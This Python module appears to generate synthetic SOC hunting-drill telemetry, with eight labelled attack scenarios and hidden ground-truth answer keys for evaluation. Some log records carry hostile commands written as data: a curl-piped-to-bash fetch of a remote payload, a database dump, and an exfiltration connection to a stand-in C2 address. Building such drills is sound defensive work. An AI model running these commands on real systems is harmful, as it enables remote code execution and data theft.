import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import List, Dict, Any, Optional

from .models import TelemetryEvent, EventType, EventFilter, AttackScenario, GroundTruth

SYNTHETIC_HOSTS = {
    "web-server-01": "10.0.1.10",
    "db-server-01": "10.0.1.20",
    "workstation-01": "10.0.1.50",
    "workstation-02": "10.0.1.51",
    "jump-host-01": "10.0.1.5"
}

SYNTHETIC_USERS = ["alice", "bob", "charlie", "root", "admin", "dbuser", "www-data"]

ATTACKER_IP = "192.168.100.99"
ATTACKER_C2_IP = "198.51.100.44"

class TelemetryGenerator:
    """
    Generates synthetic enterprise telemetry logs for SOC hunting drills.
    Maintains clean separation between public telemetry queries and hidden ground truth.
    """

    def __init__(self):
        self._events: List[TelemetryEvent] = []
        self._scenarios: Dict[str, AttackScenario] = {}
        self._active_scenario_id: str = "ssh-bruteforce"
        self._generate_dataset()

    def get_scenarios(self) -> List[Dict[str, Any]]:
        """Return public scenario metadata without ground truth details."""
        return [
            {
                "id": sc.id,
                "name": sc.name,
                "description": sc.description,
                "difficulty": sc.difficulty
            }
            for sc in self._scenarios.values()
        ]

    def set_active_scenario(self, scenario_id: str) -> bool:
        """Switch current active synthetic laboratory scenario."""
        if scenario_id in self._scenarios:
            self._active_scenario_id = scenario_id
            return True
        return False

    def get_ground_truth(self, scenario_id: str) -> Optional[GroundTruth]:
        """
        Retrieve hidden ground truth metadata for evaluation.
        STRICTLY ISOLATED from AI tool gateway search queries.
        """
        sc = self._scenarios.get(scenario_id)
        return sc.groundTruth if sc else None

    def query_events(self, filter_spec: EventFilter) -> List[TelemetryEvent]:
        """
        Query synthetic events with strict filter criteria and max cap (max 500).
        """
        results = []
        for evt in self._events:
            # Host filter
            if filter_spec.host and filter_spec.host.lower() not in evt.host.lower():
                continue
            # User filter
            if filter_spec.user and (not evt.user or filter_spec.user.lower() not in evt.user.lower()):
                continue
            # Source IP filter
            if filter_spec.source_ip and (not evt.sourceIp or filter_spec.source_ip != evt.sourceIp):
                continue
            # Destination IP filter
            if filter_spec.destination_ip and (not evt.destinationIp or filter_spec.destination_ip != evt.destinationIp):
                continue
            # Event type filter
            if filter_spec.event_type and evt.eventType != filter_spec.event_type:
                continue
            # Action filter
            if filter_spec.action and filter_spec.action.upper() not in evt.action.upper():
                continue
            # Status filter
            if filter_spec.status and evt.status.upper() != filter_spec.status.upper():
                continue
            # Time filter
            if filter_spec.start_time and evt.timestamp < filter_spec.start_time:
                continue
            if filter_spec.end_time and evt.timestamp > filter_spec.end_time:
                continue

            results.append(evt)

        # Enforce max limit cap (max 500)
        limit = min(filter_spec.limit, 500)
        return results[:limit]

    def _generate_dataset(self):
        """Build full synthetic dataset including benign activity and 8 attack scenarios."""
        base_time = datetime.now(timezone.utc) - timedelta(hours=4)
        self._events.clear()

        # 1. Generate Benign Activity Baseline
        self._generate_benign_activity(base_time)

        # 2. Build 8 Attack Scenarios
        self._build_scenario_1_ssh_bruteforce(base_time)
        self._build_scenario_2_credential_compromise(base_time)
        self._build_scenario_3_privilege_escalation(base_time)
        self._build_scenario_4_network_recon(base_time)
        self._build_scenario_5_suspicious_dns(base_time)
        self._build_scenario_6_post_login_exec(base_time)
        self._build_scenario_7_lateral_movement(base_time)
        self._build_scenario_8_suspicious_exfil(base_time)

    def _generate_benign_activity(self, base_time: datetime):
        """Generate realistic background enterprise noise."""
        for i in range(120):
            t_offset = base_time + timedelta(minutes=i * 2)
            iso_time = t_offset.isoformat()

            # Normal SSH from alice to jump-host-01
            self._events.append(TelemetryEvent(
                eventId=f"evt-benign-auth-{i:03d}",
                timestamp=iso_time,
                host="jump-host-01",
                user="alice",
                sourceIp="10.0.1.50",
                destinationIp="10.0.1.5",
                eventType=EventType.SSH,
                action="LOGIN",
                status="SUCCESS",
                metadata={"port": 22, "auth_method": "publickey", "session_id": f"sess-{i}"}
            ))

            # Normal Web request to web-server-01
            self._events.append(TelemetryEvent(
                eventId=f"evt-benign-web-{i:03d}",
                timestamp=iso_time,
                host="web-server-01",
                user="nobody",
                sourceIp="10.0.1.51",
                destinationIp="10.0.1.10",
                eventType=EventType.WEB_ACCESS,
                action="HTTP_GET",
                status="SUCCESS",
                metadata={"url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
            ))

            # Normal DNS lookup
            self._events.append(TelemetryEvent(
                eventId=f"evt-benign-dns-{i:03d}",
                timestamp=iso_time,
                host="workstation-01",
                user="alice",
                sourceIp="10.0.1.50",
                destinationIp="8.8.8.8",
                eventType=EventType.DNS,
                action="LOOKUP",
                status="SUCCESS",
                metadata={"domain": "internal.company.local", "record_type": "A", "resolved_ip": "10.0.1.20"}
            ))

    def _build_scenario_1_ssh_bruteforce(self, base_time: datetime):
        """Scenario 1: SSH Brute Force / Password Spray (T1110.001)"""
        event_ids = []
        start_t = base_time + timedelta(minutes=15)
        for j in range(25):
            t = (start_t + timedelta(seconds=j * 3)).isoformat()
            eid = f"evt-sc1-{j:03d}"
            event_ids.append(eid)
            self._events.append(TelemetryEvent(
                eventId=eid,
                timestamp=t,
                host="web-server-01",
                user="root" if j % 2 == 0 else "admin",
                sourceIp=ATTACKER_IP,
                destinationIp="10.0.1.10",
                eventType=EventType.AUTHENTICATION,
                action="FAILED_LOGIN",
                status="FAILURE",
                metadata={"port": 22, "auth_method": "password", "raw": f"sshd[{1400+j}]: Failed password for root from {ATTACKER_IP}"}
            ))

        end_t = (start_t + timedelta(seconds=75)).isoformat()

        self._scenarios["ssh-bruteforce"] = AttackScenario(
            id="ssh-bruteforce",
            name="SSH Password Brute Force",
            description="High volume authentication failure surge from external IP against web-server-01.",
            difficulty="EASY",
            groundTruth=GroundTruth(
                scenarioId="ssh-bruteforce",
                attackName="SSH Password Spray",
                description="25 SSH failed login attempts in 75 seconds from 192.168.100.99 targeting web-server-01.",
                expectedTechniques=["T1110", "T1110.001"],
                affectedHost="web-server-01",
                attackerIp=ATTACKER_IP,
                targetUser="root",
                startTime=start_t.isoformat(),
                endTime=end_t,
                groundTruthEventIds=event_ids
            )
        )

    def _build_scenario_2_credential_compromise(self, base_time: datetime):
        """Scenario 2: Credential Compromise (T1110, T1078)"""
        event_ids = []
        start_t = base_time + timedelta(minutes=45)

        # 15 failed logins followed by 1 successful root login
        for j in range(15):
            t = (start_t + timedelta(seconds=j * 4)).isoformat()
            eid = f"evt-sc2-fail-{j:03d}"
            event_ids.append(eid)
            self._events.append(TelemetryEvent(
                eventId=eid,
                timestamp=t,
                host="web-server-01",
                user="root",
                sourceIp=ATTACKER_IP,
                destinationIp="10.0.1.10",
                eventType=EventType.AUTHENTICATION,
                action="FAILED_LOGIN",
                status="FAILURE",
                metadata={"port": 22, "auth_method": "password"}
            ))

        # Successful login
        succ_t = (start_t + timedelta(seconds=64)).isoformat()
        succ_eid = "evt-sc2-succ-001"
        event_ids.append(succ_eid)
        self._events.append(TelemetryEvent(
            eventId=succ_eid,
            timestamp=succ_t,
            host="web-server-01",
            user="root",
            sourceIp=ATTACKER_IP,
            destinationIp="10.0.1.10",
            eventType=EventType.SSH,
            action="LOGIN",
            status="SUCCESS",
            metadata={"port": 22, "auth_method": "password", "session_id": "sess-root-compromised"}
        ))

        self._scenarios["credential-compromise"] = AttackScenario(
            id="credential-compromise",
            name="SSH Credential Compromise",
            description="Brute force attack resulting in successful root login on web-server-01.",
            difficulty="MEDIUM",
            groundTruth=GroundTruth(
                scenarioId="credential-compromise",
                attackName="Valid Account Access via Brute Force",
                description="Brute force resulting in valid root session from 192.168.100.99.",
                expectedTechniques=["T1110", "T1078"],
                affectedHost="web-server-01",
                attackerIp=ATTACKER_IP,
                targetUser="root",
                startTime=start_t.isoformat(),
                endTime=succ_t,
                groundTruthEventIds=event_ids
            )
        )

    def _build_scenario_3_privilege_escalation(self, base_time: datetime):
        """Scenario 3: Privilege Escalation via Sudo (T1548.003)"""
        event_ids = []
        start_t = base_time + timedelta(minutes=60)
        t1 = start_t.isoformat()

        eid1 = "evt-sc3-sudo-001"
        event_ids.append(eid1)
        self._events.append(TelemetryEvent(
            eventId=eid1,
            timestamp=t1,
            host="web-server-01",
            user="www-data",
            sourceIp="10.0.1.10",
            destinationIp="10.0.1.10",
            eventType=EventType.PRIVILEGE_ESCALATION,
            action="SUDO",
            status="SUCCESS",
            metadata={"command": "/usr/bin/sudo /bin/bash", "tty": "pts/2", "target_user": "root"}
        ))

        eid2 = "evt-sc3-proc-002"
        event_ids.append(eid2)
        self._events.append(TelemetryEvent(
            eventId=eid2,
            timestamp=(start_t + timedelta(seconds=2)).isoformat(),
            host="web-server-01",
            user="root",
            sourceIp="10.0.1.10",
            destinationIp="10.0.1.10",
            eventType=EventType.PROCESS,
            action="EXECUTE",
            status="SUCCESS",
            metadata={"process_name": "bash", "command_line": "/bin/bash", "parent_process": "sudo"}
        ))

        self._scenarios["privilege-escalation"] = AttackScenario(
            id="privilege-escalation",
            name="Sudo Abuse Privilege Escalation",
            description="Web user www-data executing root shell via sudo GTFOBins.",
            difficulty="MEDIUM",
            groundTruth=GroundTruth(
                scenarioId="privilege-escalation",
                attackName="Sudo Privilege Escalation",
                description="Unprivileged account www-data spawned root shell via sudo.",
                expectedTechniques=["T1548.003"],
                affectedHost="web-server-01",
                attackerIp="10.0.1.10",
                targetUser="www-data",
                startTime=t1,
                endTime=(start_t + timedelta(seconds=10)).isoformat(),
                groundTruthEventIds=event_ids
            )
        )

    def _build_scenario_4_network_recon(self, base_time: datetime):
        """Scenario 4: Network Reconnaissance / Nmap Port Scan (T1046)"""
        event_ids = []
        start_t = base_time + timedelta(minutes=75)

        for port in [21, 22, 80, 443, 1433, 3306, 5432, 8080]:
            t = (start_t + timedelta(milliseconds=port * 10)).isoformat()
            eid = f"evt-sc4-scan-{port}"
            event_ids.append(eid)
            self._events.append(TelemetryEvent(
                eventId=eid,
                timestamp=t,
                host="workstation-01",
                user="alice",
                sourceIp="10.0.1.50",
                destinationIp="10.0.1.20",
                eventType=EventType.NETWORK,
                action="CONNECT",
                status="DENIED" if port in [21, 1433] else "ALLOWED",
                metadata={"dest_port": port, "protocol": "TCP", "flags": "SYN"}
            ))

        self._scenarios["network-recon"] = AttackScenario(
            id="network-recon",
            name="Network Reconnaissance Scan",
            description="Port scanning sweep from workstation-01 targeting db-server-01.",
            difficulty="EASY",
            groundTruth=GroundTruth(
                scenarioId="network-recon",
                attackName="Network Service Discovery",
                description="Port scan against 10.0.1.20 across multiple database and web ports.",
                expectedTechniques=["T1046"],
                affectedHost="db-server-01",
                attackerIp="10.0.1.50",
                targetUser="alice",
                startTime=start_t.isoformat(),
                endTime=(start_t + timedelta(seconds=15)).isoformat(),
                groundTruthEventIds=event_ids
            )
        )

    def _build_scenario_5_suspicious_dns(self, base_time: datetime):
        """Scenario 5: Suspicious DNS C2 Beacon / Tunneling (T1071.004)"""
        event_ids = []
        start_t = base_time + timedelta(minutes=90)

        for k in range(10):
            t = (start_t + timedelta(seconds=k * 10)).isoformat()
            eid = f"evt-sc5-dns-{k}"
            event_ids.append(eid)
            subdomain = f"sub-{k:04d}.c2-beacon.attacker-domain.com"
            self._events.append(TelemetryEvent(
                eventId=eid,
                timestamp=t,
                host="workstation-02",
                user="bob",
                sourceIp="10.0.1.51",
                destinationIp="8.8.8.8",
                eventType=EventType.DNS,
                action="LOOKUP",
                status="SUCCESS",
                metadata={"domain": subdomain, "record_type": "TXT", "resolved_ip": ATTACKER_C2_IP}
            ))

        self._scenarios["suspicious-dns"] = AttackScenario(
            id="suspicious-dns",
            name="Suspicious DNS C2 Tunneling",
            description="High frequency TXT record queries to dynamic subdomains of c2-beacon.attacker-domain.com.",
            difficulty="MEDIUM",
            groundTruth=GroundTruth(
                scenarioId="suspicious-dns",
                attackName="Application Layer Protocol: DNS C2",
                description="DNS C2 beaconing queries originating from workstation-02.",
                expectedTechniques=["T1071.004"],
                affectedHost="workstation-02",
                attackerIp="10.0.1.51",
                targetUser="bob",
                startTime=start_t.isoformat(),
                endTime=(start_t + timedelta(seconds=100)).isoformat(),
                groundTruthEventIds=event_ids
            )
        )

    def _build_scenario_6_post_login_exec(self, base_time: datetime):
        """Scenario 6: Command Execution After Login (T1059.004)"""
        event_ids = []
        start_t = base_time + timedelta(minutes=105)
        t = start_t.isoformat()

        eid = "evt-sc6-exec-001"
        event_ids.append(eid)
        self._events.append(TelemetryEvent(
            eventId=eid,
            timestamp=t,
            host="jump-host-01",
            user="charlie",
            sourceIp="10.0.1.5",
            destinationIp="10.0.1.5",
            eventType=EventType.PROCESS,
            action="EXECUTE",
            status="SUCCESS",
            metadata={
                "process_name": "bash",
                "command_line": "curl -s http://198.51.100.44/payload.sh | bash",
                "parent_process": "sshd"
            }
        ))

        self._scenarios["post-login-exec"] = AttackScenario(
            id="post-login-exec",
            name="Post-Login Malicious Command Pipeline",
            description="Execution of remote shell script via curl piping to bash following SSH login.",
            difficulty="EASY",
            groundTruth=GroundTruth(
                scenarioId="post-login-exec",
                attackName="Command and Scripting Interpreter: Unix Shell",
                description="Remote payload execution curl | bash on jump-host-01.",
                expectedTechniques=["T1059.004"],
                affectedHost="jump-host-01",
                attackerIp="10.0.1.5",
                targetUser="charlie",
                startTime=t,
                endTime=(start_t + timedelta(seconds=5)).isoformat(),
                groundTruthEventIds=event_ids
            )
        )

    def _build_scenario_7_lateral_movement(self, base_time: datetime):
        """Scenario 7: Lateral Movement via SSH Pivot (T1021.004)"""
        event_ids = []
        start_t = base_time + timedelta(minutes=120)
        t = start_t.isoformat()

        eid = "evt-sc7-pivot-001"
        event_ids.append(eid)
        self._events.append(TelemetryEvent(
            eventId=eid,
            timestamp=t,
            host="db-server-01",
            user="dbuser",
            sourceIp="10.0.1.10",  # web-server-01 IP
            destinationIp="10.0.1.20",
            eventType=EventType.SSH,
            action="LOGIN",
            status="SUCCESS",
            metadata={"port": 22, "auth_method": "publickey", "pivot_origin": "web-server-01"}
        ))

        self._scenarios["lateral-movement"] = AttackScenario(
            id="lateral-movement",
            name="SSH Pivot Lateral Movement",
            description="SSH connection from web-server-01 to internal db-server-01 using compromised keys.",
            difficulty="HARD",
            groundTruth=GroundTruth(
                scenarioId="lateral-movement",
                attackName="Remote Services: SSH Lateral Movement",
                description="Pivot from web-server-01 (10.0.1.10) into db-server-01 (10.0.1.20).",
                expectedTechniques=["T1021.004"],
                affectedHost="db-server-01",
                attackerIp="10.0.1.10",
                targetUser="dbuser",
                startTime=t,
                endTime=(start_t + timedelta(seconds=10)).isoformat(),
                groundTruthEventIds=event_ids
            )
        )

    def _build_scenario_8_suspicious_exfil(self, base_time: datetime):
        """Scenario 8: Suspicious Outbound Data Exfiltration (T1041)"""
        event_ids = []
        start_t = base_time + timedelta(minutes=135)

        # 1. Database dump process
        eid1 = "evt-sc8-dump-001"
        event_ids.append(eid1)
        self._events.append(TelemetryEvent(
            eventId=eid1,
            timestamp=start_t.isoformat(),
            host="db-server-01",
            user="postgres",
            sourceIp="10.0.1.20",
            destinationIp="10.0.1.20",
            eventType=EventType.PROCESS,
            action="EXECUTE",
            status="SUCCESS",
            metadata={"process_name": "pg_dump", "command_line": "pg_dump enterprise_db > /tmp/db_dump.sql"}
        ))

        # 2. Large network exfiltration connection
        eid2 = "evt-sc8-exfil-002"
        event_ids.append(eid2)
        self._events.append(TelemetryEvent(
            eventId=eid2,
            timestamp=(start_t + timedelta(seconds=15)).isoformat(),
            host="db-server-01",
            user="postgres",
            sourceIp="10.0.1.20",
            destinationIp=ATTACKER_C2_IP,
            eventType=EventType.NETWORK,
            action="CONNECT",
            status="ALLOWED",
            metadata={"dest_port": 443, "protocol": "TCP", "bytes_sent": 1285000000}  # 1.28 GB
        ))

        self._scenarios["suspicious-exfil"] = AttackScenario(
            id="suspicious-exfil",
            name="Database Dump & Outbound Exfiltration",
            description="PostgreSQL database dump followed by 1.2 GB outbound HTTPS transfer to external C2 IP.",
            difficulty="HARD",
            groundTruth=GroundTruth(
                scenarioId="suspicious-exfil",
                attackName="Exfiltration Over C2 Channel",
                description="Database dump and massive outbound data transfer to 198.51.100.44.",
                expectedTechniques=["T1041"],
                affectedHost="db-server-01",
                attackerIp=ATTACKER_C2_IP,
                targetUser="postgres",
                startTime=start_t.isoformat(),
                endTime=(start_t + timedelta(seconds=45)).isoformat(),
                groundTruthEventIds=event_ids
            )
        )


# Global Telemetry Generator Instance
telemetry_engine = TelemetryGenerator()
